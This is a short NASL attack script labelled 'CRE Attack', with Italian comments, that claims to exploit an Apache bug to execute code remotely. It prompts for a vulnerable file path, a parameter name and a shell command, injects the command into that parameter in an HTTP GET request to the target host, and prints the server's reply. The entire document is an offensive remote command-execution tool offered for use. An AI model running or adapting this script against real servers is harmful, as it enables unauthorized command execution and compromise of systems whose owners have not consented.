
if(description)	{
	script_name(english:"CRE Attack");
	script_summary(english:"exploiting a bug in apache to executing code remotely");
	script_category(ACT_DESTRUCTIVE_ATTACK);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}
// Inclusione delle funzioni HTTP
include("http_func.inc");

// Indirizzo IP da attaccare
ipAddress = get_host_ip();
display("Indirizzo IP da attaccare: " + ipAddress + '\n');
// porta del server web
port = get_http_port(default:80);
display("Porta del server: " + port + '\n');
// Verifica se il server è attivo
if(get_port_state(port)) {
	soc = http_open_socket(port);
	if(soc) {
		display("Server attivo\n");
		http_close_socket(soc);
	}else{
		display("Server down/Impossible aprire socket\n");
		exit(0);
	}
}

file = prompt("Path file vulnerabile(es: /cartella/NomeFile.php): ");
param = prompt("Nome Parametro: ");
cmd = prompt("Comando da eseguire: ");
cmd = str_replace(string: cmd, find: " ", replace: "%20");
// composizione stringa finale
finalString =  strcat("http://", ipAddress, file, "?", param, "=", cmd);

if(get_port_state(port)) {
	soc = http_open_socket(port);
	if(soc) {
		// crea una richesta una GET
		request = http_get(port: port, item: finalString);
		// invia la richiesta al socket aperto
		send(socket:soc, data: request);
		// mostra a console la risposta
		resp = http_recv(socket: soc);
		display(resp);
		
		http_close_socket(soc);
	}else{
		display("Impossibile aprire socket\n");
		exit(0);
	}
}

